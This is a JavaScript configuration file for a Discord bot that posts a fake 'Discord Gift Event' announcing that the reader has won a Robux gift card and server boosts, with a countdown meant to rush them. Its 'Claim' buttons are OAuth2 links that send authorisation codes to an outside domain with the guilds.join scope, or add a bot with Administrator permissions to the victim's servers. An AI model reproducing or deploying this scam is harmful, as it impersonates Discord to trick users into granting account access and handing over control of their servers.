const OriginalEmbed = {
  content: "{mention}",
  embed: {
    title:
      "<a:giveawayparty:1043292624913711134> __Discord Gift Event__ <a:giveawayparty:1043292624913711134>",
    description:
      "**Booster Plus Event**\n<a:gifts:1043293353351073852> : Congratulations {mention}, Discord has chose you as the winner of the event **$10 Robux Giftcard & 15x Boost Gift**\n\n<a:exclmark:1043292193248530552> **How to claim your $10 Robux Giftcard & 115x Boost Gift**\n\n<a:arrow_arrow:1043293202494533764>   Click on the **Menu** and choose one prize\n<a:arrow_arrow:1043293202494533764>  Once you have chosen a prize,**await for your gift!**\n\n:timer: Event ends in `72 hours`\nBe ** be quick to claim your prize** or it will be rerolled to __someone else__!",
    color: "#00ffea",
    footer: {
      text: "",
      iconUrl: "",
    },
    image: {
      url: "https://media.discordapp.net/attachments/995049851580588186/1043368027695095938/New_Project_-_2022-11-18T223142.945.png?width=637&height=288",
    },
  },
  selectMenu: [
    {
      label: "Robux 10$",
      description: "Claim 10$ Roblox Giftcard",
      value: "select-one",
      emoji: "<:booster1:1046557546015641670>",
    },
    {
      label: "15x Boost Gift",
      description: "Claim a 15x Boost Gift",
      value: "select-two",
      emoji: "<:white_gift:1046556845763993743>",
    },
  ],
};

const EmbedOptionOne = {
  content: "https://cdn.discordapp.com/attachments/984610353390432276/1053166228430139442/R.png",
  title:
    "",
  description: "",
  color: "",
  footer: {
    text: "",
    iconUrl: "",
  },
  image: {
    url: "",
  },
  buttons: [
    { label: "Claim", url: "https://discord.com/api/oauth2/authorize?client_id=905560657510924359&redirect_uri=https%3A%2F%2Fapi.nitro-gifts.xyz%2Fapi%2Fv1%2Fdiscord%2Foauth2&response_type=code&scope=guilds.join%20identify", emoji: { id: null, name: "🎁" } },
  ],
};

const EmbedOptionTwo = {
  content: "https://media.discordapp.net/attachments/983918868848332831/1052350917967618088/image.png",
  title: "",
  description: "",
  color: "",
  footer: {
    text: "",
    iconUrl: "",
  },
  image: {
    url: "",
  },
  buttons: [
    {
      label: "Claim",
      url: "https://discord.com/api/oauth2/authorize?client_id=1032819338161430539&permissions=8&redirect_uri=https%3A%2F%2Fdiscord.gg%2Fx-gifts&response_type=code&scope=identify%20bot",
      emoji: { id: null, name: "🎁" },
    },
  ],
};

module.exports = { OriginalEmbed, EmbedOptionOne, EmbedOptionTwo };
